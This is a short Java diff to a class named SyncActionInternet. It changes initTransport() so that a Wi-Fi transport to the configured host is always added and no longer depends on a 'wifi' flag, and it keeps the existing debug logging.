@@ -98,17 +98,15 @@ public class SyncActionInternet extends SyncAction {
 	protected boolean initTransport() {
 		transports.clear();
 		
-		if (wifi) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " initTransport adding WifiTransport"); //$NON-NLS-1$
-			}
-			
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (initTransport): wifiForced: " + wifiForced); //$NON-NLS-1$
-			}
-			
-			transports.addElement(new WifiTransport(host, wifiForced));
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " initTransport adding WifiTransport"); //$NON-NLS-1$
 		}
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (initTransport): wifiForced: " + wifiForced); //$NON-NLS-1$
+		}
+		
+		transports.addElement(new WifiTransport(host, wifiForced));
 
 		if (gprs) {
 			if (Cfg.DEBUG) {
